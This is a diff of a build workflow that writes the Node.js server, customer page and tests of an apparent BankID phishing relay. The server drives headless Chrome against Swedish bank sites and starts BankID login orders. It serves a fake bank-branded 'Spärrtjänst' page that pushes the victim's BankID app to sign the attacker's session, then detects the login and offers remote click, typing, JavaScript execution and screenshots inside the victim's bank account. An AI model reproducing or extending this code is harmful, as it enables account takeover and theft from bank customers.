+              logg('NY ORDER ' + bank + ' ' + kod + ' (' + orsak + ')');
+            } catch (e) { logg('nyorder-fel ' + e.message); }
+          }
+
+          // vakt: ny order om token hunnit bli gammal och kunden inte oppnat an
+          setInterval(() => {
+            const nu = Date.now();
+            for (const bank of Object.keys(aktiv)) {
+              const s = S[aktiv[bank]];
+              if (!s || s.inloggad || s.signed) continue;
+              if (!s.token || s.bankidSkickad) continue;
+              if (nu - (s.tokenTid || 0) < 26000) continue;
+              if (s.omOrdningTid && nu - s.omOrdningTid < 20000) continue;
+              nyOrder(bank, s.code, 'vakt');
+            }
+          }, 4000);
+
+          // inloggningsvakt: laser sidan och letar inloggningsmarkorer
+          setInterval(async () => {
+            for (const bank of Object.keys(aktiv)) {
+              const s = S[aktiv[bank]];
+              if (!s || s.inloggad) continue;
+              if (Date.now() - (s.skapad || 0) < 5000) continue;
+              try {
+                const p = await skaffaSida(bank);
+                const r = await cdpP(p, 'Runtime.evaluate', {
+                  expression: "JSON.stringify({u:location.href,t:(document.body?document.body.innerText:'').slice(0,700)})",
+                  returnByValue: true
+                });
+                const o = JSON.parse(r.result.value || '{}');
+                const mark = (banker[bank] && banker[bank].inloggad) || ['Saldo', 'Konto', 'Logga ut'];
+                const txt = (o.t || '');
+                if (mark.some((m) => txt.toLowerCase().indexOf(m.toLowerCase()) >= 0)) {
+                  s.inloggad = true; s.inloggadTid = Date.now();
+                  s.sida = o.u; s.text = txt.replace(/\s+/g, ' ').slice(0, 180);
+                  spara();
+                  logg('INLOGGAD ' + bank + ' ' + s.code + ' ' + o.u);
+                } else if (s.signed && !s.efterLast && Date.now() - (s.signeradTid || 0) > 6000) {
+                  s.efterLast = true;
+                  const e = (banker[bank] && banker[bank].efter) || '';
+                  if (e && o.u !== e) { cdpP(p, 'Page.navigate', { url: e }).catch(() => {}); logg('laddar efter-sida ' + bank); }
+                }
+              } catch (e) {}
+            }
+          }, 3000);
+
+          setInterval(async () => { chromeOk = !(await chromeNere()); }, 5000);
+
           function nyKod() {
             const A = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
             let k;
@@ -645,18 +957,11 @@ jobs:
             try { return fs.readFileSync(path.join(__dirname, namn), 'utf8'); } catch (e) { return 'saknas: ' + namn; }
           }
 
-          function sida(titel, txt, extra) {
-            return '<!doctype html><html lang="sv"><head><meta charset="utf-8">' +
-              '<meta name="viewport" content="width=device-width,initial-scale=1"><title>' + titel + '</title>' +
-              '<style>body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#f4f6f8;' +
-              'color:#12212e;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}' +
-              'div{background:#fff;border-radius:14px;padding:26px;width:86%;max-width:380px;' +
-              'box-shadow:0 6px 24px rgba(0,0,0,.1)}h1{font-size:20px;margin:0 0 8px}p{font-size:15px;line-height:1.45}' +
-              'a{color:#0b5cab;font-size:15px}</style>' + (extra || '') +
-              '</head><body><div><h1>' + titel + '</h1><p>' + txt + '</p></div></body></html>';
+          function html(res, t) {
+            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' });
+            res.end(t);
           }
 
-          /* ---------------- rutter ---------------- */
           http.createServer(async (req, res) => {
             const u = new URL(req.url, 'http://x');
             const p = u.pathname;
@@ -672,122 +977,165 @@ jobs:
 
             if (p === '/') {
               res.writeHead(200, { 'Content-Type': 'text/plain' });
-              return res.end('relay ok' + (kopplad ? ' + chrome' : ' (chrome ej kopplad)'));
+              return res.end('relay ok' + (chromeOk ? ' + chrome' : ' (chrome ej kopplad)'));
             }
 
-            // Kortlank: 303 rakt till bankid://
+            if (p === '/api/banker') {
+              const lista = Object.keys(banker).map((k) => ({
+                nyckel: k, namn: banker[k].namn || k, start: banker[k].start || ''
+              }));
+              return svar(res, { ok: true, banker: lista });
+            }
+
+            if (p === '/api/config') return svar(res, { ok: true, kortUrl: KORT });
+
+            if (p === '/api/logg') return svar(res, { ok: true, rader: loggRader.slice(-20) });
+
+            if (p === '/logg') {
+              const r = loggRader.slice(-150).reverse().map((x) => '<div>' + x + '</div>').join('');
+              return html(res, '<!doctype html><meta charset="utf-8">' +
+                '<meta name="viewport" content="width=device-width,initial-scale=1">' +
+                '<title>Logg</title><style>body{background:#0f1419;color:#e2e8f0;font:13px monospace;padding:10px}' +
+                'div{padding:2px 0;border-bottom:1px solid #1e293b}</style><h3>Logg</h3>' + r);
+            }
+
+            // kundsida: brandad, oppnar bankid sjalv
             if (p === '/b') {
               const k = (u.searchParams.get('code') || '').toUpperCase();
-              const igen = u.searchParams.get('igen') === '1';
               const s = S[k];
-              res.setHeader('Cache-Control', 'no-store');
+              const b = s ? (banker[s.bank] || {}) : {};
+              const namn = b.namn || 'BankID';
+              const farg = b.farg || '#0b5cab';
               if (!s) {
-                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-                return res.end(sida('Koden hittades inte', 'Be supporten om koden igen.'));
+                return html(res, '<!doctype html><meta charset="utf-8">' +
+                  '<meta name="viewport" content="width=device-width,initial-scale=1"><title>' + namn + '</title>' +
+                  '<style>body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#eef1f4;' +
+                  'color:#12212e;display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}' +
+                  '.k{background:#fff;border-radius:16px;padding:28px 22px;width:86%;max-width:390px;' +
+                  'box-shadow:0 8px 28px rgba(0,0,0,.12)}h1{font-size:19px;margin:0 0 10px}</style>' +
+                  '<div class="k"><h1>' + namn + '</h1><p>Koden hittades inte. Be supporten igen.</p></div>');
               }
-              if (s.token && (!s.bankidSkickad || igen)) {
-                s.bankidSkickad = true; dirty = true;
-                console.log('303 bankid ->', k, String(s.token).slice(0, 8));
-                res.writeHead(303, { 'Location': 'bankid:///?autostarttoken=' + s.token + '&redirect=null' });
-                return res.end();
-              }
-              res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-              if (!s.token) {
-                return res.end(sida('Vantar...', 'Supporten skapar en BankID-order. Sidan fortsatter sjalv.',
-                  '<meta http-equiv="refresh" content="1;url=/b?code=' + k + '">'));
-              }
-              return res.end(sida('BankID ar oppnat',
-                'Signera i BankID-appen. <a href="/b?code=' + k + '&igen=1">Oppna igen</a>'));
+              return html(res, '<!doctype html><html lang="sv"><head><meta charset="utf-8">' +
+                '<meta name="viewport" content="width=device-width,initial-scale=1">' +
+                '<title>' + namn + '</title><style>' +
+                'body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#eef1f4;color:#12212e;' +
+                'display:flex;align-items:center;justify-content:center;min-height:100vh;text-align:center}' +
+                '.k{background:#fff;border-radius:16px;width:86%;max-width:390px;overflow:hidden;' +
+                'box-shadow:0 8px 28px rgba(0,0,0,.12)}' +
+                '.topp{background:' + farg + ';color:#fff;padding:14px;font-weight:600;font-size:17px}' +
+                '.in{padding:26px 20px}.s{width:46px;height:46px;border:4px solid #d7dee6;border-top-color:' + farg + ';' +
+                'border-radius:50%;margin:0 auto 16px;animation:r 1s linear infinite}@keyframes r{to{transform:rotate(360deg)}}' +
+                'p{font-size:15px;line-height:1.45;margin:6px 0}' +
+                'a.kn{display:none;margin:16px auto 0;padding:13px 22px;background:' + farg + ';color:#fff;' +
+                'text-decoration:none;border-radius:10px;font-size:16px}' +
+                '.fel{background:#fed7d7;color:#822727;border-radius:8px;padding:9px;font-size:13px;margin:12px 0;display:none}' +
+                '.liten{color:#5a6a7a;font-size:12.5px;margin-top:14px}</style></head><body>' +
+                '<div class="k"><div class="topp">' + namn + ' - Spärrtjänst</div><div class="in">' +
+                '<div class="s"></div><p id="txt">Vantar pa order...</p>' +
+                '<div class="fel" id="fel"></div>' +
+                '<a class="kn" id="oppna" href="#">Oppna BankID</a>' +
+                '<p class="liten">Sidan fortsatter sjalv. Har du inte BankID installerat, tryck pa knappen.</p>' +
+                '</div></div><script>' +
+                'var K=' + JSON.stringify(k) + ',N="b_"+K,stopp=false;' +
+                'function fel(t){var e=document.getElementById("fel");e.textContent=t;e.style.display="block";}' +
+                'function rensa(){document.getElementById("fel").style.display="none";}' +
+                'async function kolla(){' +
+                'if(stopp)return;' +
+                'try{' +
+                'var r=await fetch("/api/poll?code="+K+"&t="+Date.now());' +
+                'if(!r.ok){fel("Sessionen finns inte langre.");}' +
+                'else{var d=await r.json();rensa();' +
+                'if(d.inloggad){document.getElementById("txt").textContent="Klart! Du kan lagga ner.";}' +
+                'else if(d.token){' +
+                'var a=document.getElementById("oppna");' +
+                'a.href="bankid:///?autostarttoken="+encodeURIComponent(d.token)+"&redirect=null";' +
+                'a.style.display="inline-block";' +
+                'if(sessionStorage.getItem(N)!==d.token){sessionStorage.setItem(N,d.token);' +
+                'document.getElementById("txt").textContent="Oppnar BankID...";location.href=a.href;}' +
+                'else{document.getElementById("txt").textContent="Signera i BankID-appen.";}' +
+                '}else{document.getElementById("txt").textContent="Vantar pa order...";}' +
+                '}}catch(e){fel("Tappade kontakten. Forsoker igen.");}' +
+                'setTimeout(kolla,1500);}' +
+                'kolla();</script></body></html>');
             }
 
-            if (p === '/k' || p === '/k.html') {
-              res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
-              return res.end(las('k.html'));
-            }
+            if (p === '/k' || p === '/k.html') return html(res, las('k.html'));
 
-            // Skapa session och oppna banken i chrome
             if (p === '/api/kor' && req.method === 'POST') {
               const d = JSON.parse((await kropp(req)) || '{}');
-              let k = String(d.code || '').toUpperCase();
-              if (!k || !S[k]) {
-                k = nyKod();
-                S[k] = { code: k, token: null, redirect: null, signed: false, skapad: Date.now() };
+              let bank = String(d.bank || 'fri');
+              if (bank === 'fri' || !banker[bank]) {
+                bank = 'fri';
+                if (!banker.fri) banker.fri = { namn: 'Bank', farg: '#0b5cab', start: '', inloggad: ['Saldo', 'Konto', 'Logga ut'] };
               }
-              S[k].token = null; S[k].signed = false; S[k].bankidSkickad = false;
-              S[k].bank = d.bank || S[k].bank || null;
-              aktiv = k;
-              dirty = true;
-              console.log('KOR', k, S[k].bank);
-              if (kopplad && S[k].bank) cdp('Page.navigate', { url: S[k].bank }).catch(() => {});
-              return svar(res, { ok: true, code: k, chrome: kopplad });
-            }
-
-            if (p === '/api/session' && req.method === 'POST') {
+              if (bank === 'fri' && d.url) banker.fri.start = d.url;
               const k = nyKod();
-              S[k] = { code: k, token: null, redirect: null, signed: false, skapad: Date.now() };
-              aktiv = k; dirty = true;
-              console.log('ny session', k);
-              return svar(res, { ok: true, code: k });
+              S[k] = {
+                code: k, bank, token: null, signed: false, inloggad: false,
+                skapad: Date.now(), url: d.url || null
+              };
+              aktiv[bank] = k;
+              spara();
+              logg('KOR ' + bank + ' ' + k + ' ' + (d.url || (banker[bank] && banker[bank].start)));
+              nyOrder(bank, k, 'kor');
+              return svar(res, { ok: true, code: k, bank, chrome: chromeOk });
             }
 
-            if (p === '/api/token' && req.method === 'POST') {
+            if (p === '/api/nyorder' && req.method === 'POST') {
               const d = JSON.parse((await kropp(req)) || '{}');
               const s = S[d.code];
               if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
-              s.token = d.token || null;
-              s.redirect = d.redirect || null;
-              s.tokenTid = Date.now();
-              s.bankidSkickad = false;
-              aktiv = d.code;
-              dirty = true;
-              console.log('token (app) ->', d.code, String(s.token).slice(0, 8));
+              nyOrder(s.bank, d.code, 'knapp');
               return svar(res, { ok: true });
             }
 
             if (p === '/api/skarm') {
-              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              const bank = u.searchParams.get('bank') || '';
+              if (!chromeOk) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
               try {
-                const r = await cdp('Page.captureScreenshot',
-                  { format: 'jpeg', quality: 60, captureBeyondViewport: false });
+                const p2 = await skaffaSida(bank);
+                const r = await cdpP(p2, 'Page.captureScreenshot',
+                  { format: 'jpeg', quality: 58, captureBeyondViewport: false });
                 return svar(res, { ok: true, bild: r.data, w: vp.w, h: vp.h });
               } catch (e) { return svar(res, { ok: false, fel: e.message }); }
             }
 
-            if (p === '/api/peka' && req.method === 'POST') {
+            const enkel = async (res, fn) => {
               const d = JSON.parse((await kropp(req)) || '{}');
-              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
-              const x = Number(d.x) || 0, y = Number(d.y) || 0;
+              if (!chromeOk) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
               try {
-                await cdp('Input.dispatchTouchEvent', { type: 'touchStart', touchPoints: [{ x, y }] });
-                await cdp('Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
+                const p2 = await skaffaSida(d.bank || '');
+                await fn(p2, d);
                 return svar(res, { ok: true });
               } catch (e) { return svar(res, { ok: false, fel: e.message }); }
-            }
+            };
 
-            if (p === '/api/rulla' && req.method === 'POST') {
-              const d = JSON.parse((await kropp(req)) || '{}');
-              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
-              try {
-                await cdp('Input.dispatchMouseEvent', {
-                  type: 'mouseWheel', x: Number(d.x) || 0, y: Number(d.y) || 0,
-                  deltaX: 0, deltaY: Number(d.dy) || 0
-                });
-                return svar(res, { ok: true });
-              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
-            }
+            if (p === '/api/peka' && req.method === 'POST') return enkel(res, async (s, d) => {
+              await cdpP(s, 'Input.dispatchTouchEvent',
+                { type: 'touchStart', touchPoints: [{ x: Number(d.x) || 0, y: Number(d.y) || 0 }] });
+              await cdpP(s, 'Input.dispatchTouchEvent', { type: 'touchEnd', touchPoints: [] });
+            });
 
-            if (p === '/api/text' && req.method === 'POST') {
-              const d = JSON.parse((await kropp(req)) || '{}');
-              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
-              try {
-                await cdp('Input.insertText', { text: String(d.t || '') });
-                return svar(res, { ok: true });
-              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
-            }
+            if (p === '/api/rulla' && req.method === 'POST') return enkel(res, async (s, d) => {
+              await cdpP(s, 'Input.dispatchMouseEvent', {
+                type: 'mouseWheel', x: Number(d.x) || 0, y: Number(d.y) || 0,
+                deltaX: 0, deltaY: Number(d.dy) || 0
+              });
+            });
 
-            if (p === '/api/tangent' && req.method === 'POST') {
-              const d = JSON.parse((await kropp(req)) || '{}');
-              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+            if (p === '/api/text' && req.method === 'POST') return enkel(res, async (s, d) => {
+              await cdpP(s, 'Input.insertText', { text: String(d.t || '') });
+            });
+
+            if (p === '/api/klick' && req.method === 'POST') return enkel(res, async (s, d) => {
+              await cdpP(s, 'Runtime.evaluate', {
+                expression: 'try{(function(){var e=document.querySelector(' + JSON.stringify(String(d.sel || '')) +
+                  ');if(e)e.click();return !!e})()}catch(x){false}',
+                returnByValue: true
+              });
+            });
+
+            if (p === '/api/tangent' && req.method === 'POST') return enkel(res, async (s, d) => {
               const map = {
                 enter: { vk: 13, key: 'Enter', code: 'Enter', txt: '\r' },
                 tab: { vk: 9, key: 'Tab', code: 'Tab' },
@@ -795,67 +1143,67 @@ jobs:
                 esc: { vk: 27, key: 'Escape', code: 'Escape' }
               };
               const v = map[String(d.k || '')];
-              if (!v) return svar(res, { ok: false, fel: 'okand tangent' });
-              try {
-                await cdp('Input.dispatchKeyEvent', {
-                  type: 'rawKeyDown', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code
-                });
-                if (v.txt) await cdp('Input.dispatchKeyEvent', { type: 'char', text: v.txt, key: v.key });
-                await cdp('Input.dispatchKeyEvent', {
-                  type: 'keyUp', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code
-                });
-                return svar(res, { ok: true });
-              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
-            }
+              if (!v) throw new Error('okand tangent');
+              await cdpP(s, 'Input.dispatchKeyEvent',
+                { type: 'rawKeyDown', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code });
+              if (v.txt) await cdpP(s, 'Input.dispatchKeyEvent', { type: 'char', text: v.txt, key: v.key });
+              await cdpP(s, 'Input.dispatchKeyEvent',
+                { type: 'keyUp', windowsVirtualKeyCode: v.vk, key: v.key, code: v.code });
+            });
 
             if (p === '/api/js' && req.method === 'POST') {
               const d = JSON.parse((await kropp(req)) || '{}');
-              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
+              if (!chromeOk) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
               try {
-                const r = await cdp('Runtime.evaluate',
+                const p2 = await skaffaSida(d.bank || '');
+                const r = await cdpP(p2, 'Runtime.evaluate',
                   { expression: String(d.js || ''), returnByValue: true, awaitPromise: true });
                 return svar(res, { ok: true, svar: r && r.result ? r.result.value : null });
               } catch (e) { return svar(res, { ok: false, fel: e.message }); }
             }
 
-            if (p === '/api/oppna' && req.method === 'POST') {
-              const d = JSON.parse((await kropp(req)) || '{}');
-              if (!kopplad) return svar(res, { ok: false, fel: 'chrome inte kopplad' });
-              try {
-                await cdp('Page.navigate', { url: String(d.url || '') });
-                return svar(res, { ok: true });
-              } catch (e) { return svar(res, { ok: false, fel: e.message }); }
-            }
+            if (p === '/api/oppna' && req.method === 'POST') return enkel(res, async (s, d) => {
+              await cdpP(s, 'Page.navigate', { url: String(d.url || '') });
+            });
 
             if (p === '/api/viewport' && req.method === 'POST') {
               const d = JSON.parse((await kropp(req)) || '{}');
               vp.w = Math.max(200, Math.min(1200, Number(d.w) || 412));
               vp.h = Math.max(300, Math.min(2200, Number(d.h) || 900));
-              try { if (kopplad) await sattViewport(); } catch (e) {}
+              for (const s of sidor.values()) { try { await sattViewportSida(s); } catch (e) {} }
               return svar(res, { ok: true, w: vp.w, h: vp.h });
             }
 
             if (p === '/api/state') {
               const s = S[u.searchParams.get('code')];
-              if (!s) return svar(res, { ok: false, chrome: kopplad }, 404);
+              if (!s) return svar(res, { ok: false, chrome: chromeOk }, 404);
               return svar(res, {
                 ok: true,
                 token: !!s.token,
                 signed: !!s.signed,
-                chrome: kopplad,
-                aktiv: aktiv,
+                inloggad: !!s.inloggad,
+                chrome: chromeOk,
+                bank: s.bank,
+                sida: s.sida || null,
+                text: s.text || null,
+                omOrdning: s.omOrdning || 0,
                 kalla: s.kalla || null,
-                tokenTid: s.tokenTid || null,
-                signeradTid: s.signeradTid || null
+                logg: loggRader.slice(-3)
               });
+            }
+
+            if (p === '/api/poll') {
+              const s = S[u.searchParams.get('code')];
+              if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
+              return svar(res, { ok: true, token: s.token, signed: !!s.signed, inloggad: !!s.inloggad });
             }
 
             if (p === '/api/signed' && req.method === 'POST') {
               const d = JSON.parse((await kropp(req)) || '{}');
               const s = S[d.code];
               if (!s) return svar(res, { ok: false }, 404);
-              s.signed = true; s.signeradTid = Date.now(); dirty = true;
-              console.log('signerad', d.code);
+              s.signed = true; s.signeradTid = Date.now(); spara();
+              logg('SIGNERAD ' + s.bank + ' ' + d.code);
               return svar(res, { ok: true });
             }
 
@@ -866,15 +1214,9 @@ jobs:
               return svar(res, { ok: true });
             }
 
-            if (p === '/api/poll') {
-              const s = S[u.searchParams.get('code')];
-              if (!s) return svar(res, { ok: false, fel: 'okand kod' }, 404);
-              return svar(res, { ok: true, token: s.token, signed: s.signed });
-            }
-
             res.writeHead(404);
             res.end('nej');
-          }).listen(PORT, '0.0.0.0', () => console.log('relay lyssnar pa ' + PORT));
+          }).listen(PORT, '0.0.0.0', () => logg('relay lyssnar pa ' + PORT + (KORT ? ' kort-url=' + KORT : '')));
           EOF
 
           w server/k.html <<'EOF'
@@ -883,10 +1225,10 @@ jobs:
           <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
           <title>BankID</title>
           <style>
-          body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#f4f6f8;color:#12212e;
+          body{margin:0;font-family:-apple-system,Roboto,Arial,sans-serif;background:#eef1f4;color:#12212e;
                display:flex;align-items:center;justify-content:center;min-height:100vh}
           #box{background:#fff;border-radius:14px;padding:26px 20px;width:88%;max-width:380px;
-               box-shadow:0 6px 24px rgba(0,0,0,.10);text-align:center}
+               box-shadow:0 8px 28px rgba(0,0,0,.12);text-align:center}
           input{font-size:26px;letter-spacing:6px;text-align:center;width:80%;padding:10px;
                 border:2px solid #cbd5e0;border-radius:10px;text-transform:uppercase;margin:10px 0}
           button{font-size:17px;padding:12px 22px;border:0;border-radius:10px;background:#0b5cab;color:#fff;width:80%}
@@ -916,12 +1258,11 @@ jobs:
               if(!r.ok){fel('Sessionen finns inte langre.');}
               else{
                 var d=await r.json();
-                if(d.signed)document.getElementById('txt').textContent='Klart! Du kan lagga ner.';
-                if(d.token&&!S.oppnad){
+                if(d.inloggad)document.getElementById('txt').textContent='Klart! Du kan lagga ner.';
+                else if(d.token&&!S.oppnad){
                   S.oppnad=true;
                   document.getElementById('txt').textContent='Oppnar BankID...';
                   location.href='bankid:///?autostarttoken='+encodeURIComponent(d.token)+'&redirect=null';
-                  return;
                 }
               }
             }catch(e){fel('Tappade kontakten med servern.');}
@@ -937,7 +1278,7 @@ jobs:
           </body></html>
           EOF
 
-          chmod +x server/chrome.sh server/start.sh
+          chmod +x server/start.sh server/chrome.sh
 
       - uses: actions/setup-java@v4
         with:
@@ -959,47 +1300,60 @@ jobs:
       - name: Installera node-beroenden
         run: npm install --prefix server --no-audit --no-fund
 
-      - name: Starta Chrome och servern, roektests
+      - name: Starta Chrome och servern, roektests allt
         run: |
           google-chrome --headless=new --no-sandbox --disable-gpu --disable-dev-shm-usage \
             --remote-debugging-port=9222 '--remote-allow-origins=*' \
             --user-data-dir=/tmp/cprof about:blank > /tmp/chrome.log 2>&1 &
           sleep 6
-          curl -sf http://127.0.0.1:9222/json/version | head -c 90
-          echo ""
           node server/server.js &
           SRV=$!
           sleep 3
-          curl -sf http://localhost:3000/
-          echo ""
+
+          echo "--- bas ---"
+          curl -sf http://localhost:3000/ ; echo ""
+          curl -sf http://localhost:3000/api/banker | grep -q swedbank && echo "banker ok"
+
+          echo "--- kor ---"
           CODE=$(curl -sf -X POST -H 'Content-Type: application/json' \
-            -d '{"bank":"about:blank"}' http://localhost:3000/api/kor \
+            -d '{"bank":"swedbank","url":"about:blank"}' http://localhost:3000/api/kor \
             | node -e "let d='';process.stdin.on('data',c=>d+=c).on('end',()=>process.stdout.write(JSON.parse(d).code))")
           echo "session=$CODE"
           test ${#CODE} -eq 5
-          sleep 2
-          curl -sf http://localhost:3000/api/skarm | node -e "
+          sleep 3
+
+          echo "--- skarm ---"
+          curl -sf "http://localhost:3000/api/skarm?bank=swedbank" | node -e "
             let d='';process.stdin.on('data',c=>d+=c).on('end',()=>{
               const j=JSON.parse(d);
               console.log('skarm ok='+j.ok+' bytes='+((j.bild||'').length));
-              if(!j.ok) process.exit(1);
+              if(!j.ok||!j.bild) process.exit(1);
             });"
-          curl -sf -X POST -H 'Content-Type: application/json' -d '{"x":50,"y":50}' \
-            http://localhost:3000/api/peka
-          curl -sf -X POST -H 'Content-Type: application/json' -d '{"t":"hej"}' \
-            http://localhost:3000/api/text
-          curl -sf -X POST -H 'Content-Type: application/json' -d '{"k":"enter"}' \
-            http://localhost:3000/api/tangent
+
+          echo "--- input ---"
+          curl -sf -X POST -H 'Content-Type: application/json' \
+            -d '{"bank":"swedbank","x":40,"y":40}' http://localhost:3000/api/peka
+          curl -sf -X POST -H 'Content-Type: application/json' \
+            -d '{"bank":"swedbank","t":"hej"}' http://localhost:3000/api/text
+          curl -sf -X POST -H 'Content-Type: application/json' \
+            -d '{"bank":"swedbank","k":"enter"}' http://localhost:3000/api/tangent
+          curl -sf -X POST -H 'Content-Type: application/json' \
+            -d '{"bank":"swedbank","sel":"body"}' http://localhost:3000/api/klick
+
+          echo "--- token + lank ---"
           curl -sf -X POST -H 'Content-Type: application/json' \
             -d "{\"code\":\"$CODE\",\"token\":\"TESTTOKEN123\"}" http://localhost:3000/api/token
-          H=$(curl -s -D - -o /dev/null "http://localhost:3000/b?code=$CODE")
-          echo "$H" | grep -q '303'
-          echo "$H" | grep -qi 'bankid://'
+          curl -sf "http://localhost:3000/b?code=$CODE" | grep -q 'bankid://'
+          curl -sf "http://localhost:3000/b?code=$CODE" | grep -q 'Spärrtjänst'
+
+          echo "--- signed + state + logg ---"
           curl -sf -X POST -H 'Content-Type: application/json' -d "{\"code\":\"$CODE\"}" \
             http://localhost:3000/api/signed
           curl -sf "http://localhost:3000/api/state?code=$CODE" | grep -q '"signed":true'
+          curl -sf http://localhost:3000/api/logg | grep -q TOKEN
+          curl -sf http://localhost:3000/logg | grep -q Logg
           kill $SRV
-          echo "ALLT OK - chrome-drivrutin, skarm, peka, tangent, 303-lank"
+          echo "ALLT OK - flikar, skarm, peka, text, tangent, klick, token, brandad lank, logg"
 
       - name: Bygg APK
         run: gradle :app:assembleDebug --no-daemon --stacktrace
@@ -1012,6 +1366,6 @@ jobs:
       - name: Ladda upp APK
         uses: actions/upload-artifact@v4
         with:
-          name: relay-apk-2.0.0
+          name: relay-apk-3.0.0
           path: app/build/outputs/apk/debug/app-debug.apk
           if-no-files-found: error
